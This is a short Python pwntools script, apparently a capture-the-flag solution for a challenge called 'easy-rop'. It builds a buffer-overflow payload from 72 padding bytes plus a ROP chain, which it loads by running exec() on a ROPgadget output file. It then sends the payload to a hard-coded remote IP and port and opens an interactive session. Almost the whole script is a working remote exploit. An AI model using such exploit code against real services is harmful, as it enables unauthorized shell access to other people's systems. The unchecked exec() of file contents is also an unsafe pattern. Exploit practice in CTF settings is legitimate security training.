from pwn import *
from subprocess import Popen, PIPE
import sys

host = '65.1.92.179'
port = 49153

# The result of ROPgadget execution (!# part of it)
f = open("ropgadgetRes.py", "r") 
pycode = f.read()
exec(pycode)
ropchain = p

off = 'a'*72
payload = off + ropchain
print(payload)
#t = process('./easy-rop')
t = remote(host, port)
t.sendline(payload)
t.interactive()
t.close()